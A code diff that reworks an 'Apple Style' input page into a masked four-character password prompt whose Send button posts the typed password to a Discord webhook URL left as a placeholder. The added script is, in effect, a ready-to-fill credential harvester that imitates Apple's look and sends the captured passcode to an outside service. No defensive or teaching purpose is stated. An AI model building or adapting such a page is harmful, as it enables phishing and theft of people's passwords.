@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple Style Input Bar</title>
+    <title>Apple Style Input Bar with Send Button</title>
     <style>
         * {
             margin: 0;
@@ -27,16 +27,33 @@
             max-width: 400px;
         }
 
+        .input-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .icon {
+            width: 30px; /* Set the icon size */
+            height: auto;
+            margin-bottom: 8px; /* Space between the icon and the input box */
+        }
+
         .input-bar {
             width: 100%;
             padding: 15px;
-            border-radius: 25px;
+            border-radius: 10px; /* Apple-style rounded, more rectangular */
             border: 1px solid #d1d1d6;
             background-color: white;
             font-size: 17px;
             color: #333;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             outline: none;
+            letter-spacing: 2px;
+            text-align: center;
+            max-width: 250px;
         }
 
         .input-bar:focus {
@@ -44,28 +61,81 @@
             box-shadow: 0 0 10px rgba(0, 122, 255, 0.3);
         }
 
-        .placeholder {
-            color: #a1a1a6;
+        .send-btn {
+            padding: 12px 20px;
+            background-color: #007aff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .send-btn:hover {
+            background-color: #005bb5;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <input type="text" class="input-bar" id="inputBar" placeholder="Search or type something..." />
+        <div class="input-container">
+            <!-- Icon above the input box -->
+            <img src="icon.png" alt="icon" class="icon" />
+            
+            <input type="password" class="input-bar" id="inputBar" maxlength="4" placeholder="Enter password" />
+            <button class="send-btn" id="sendButton">Send</button>
+        </div>
     </div>
 
     <script>
-        // Adding some JS to make it feel interactive like the Apple input bar
         const inputBar = document.getElementById('inputBar');
+        const sendButton = document.getElementById('sendButton');
+        const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+
+        // Dynamically update the input bar with bullet points as the user types
+        inputBar.addEventListener('input', function() {
+            let value = inputBar.value;
+            let maskedValue = '•'.repeat(value.length) + '_'.repeat(4 - value.length); // Mask typed characters with bullet points and leave remaining spaces as underscores
+            inputBar.setAttribute('placeholder', maskedValue); // Update placeholder to show masked input
+        });
 
         inputBar.addEventListener('focus', () => {
-            // Change placeholder style when focused
-            inputBar.placeholder = '';
+            inputBar.placeholder = ''; // Hide placeholder text when focused
         });
 
         inputBar.addEventListener('blur', () => {
-            // Reset placeholder text when focus is lost
-            inputBar.placeholder = 'Search or type something...';
+            inputBar.placeholder = 'Enter password'; // Reset placeholder when input loses focus
+        });
+
+        sendButton.addEventListener('click', () => {
+            const password = inputBar.value; // Get the actual input value
+
+            if (password.length === 4) {
+                // Send password to Discord webhook
+                const payload = {
+                    content: `Password entered: ${password}`,
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert('Password sent to Discord!');
+                    inputBar.value = ''; // Reset input after sending
+                })
+                .catch(error => {
+                    alert('Error sending message to Discord');
+                    console.error('Error:', error);
+                });
+            } else {
+                alert('Please enter a 4-character password.');
+            }
         });
     </script>
 </body>
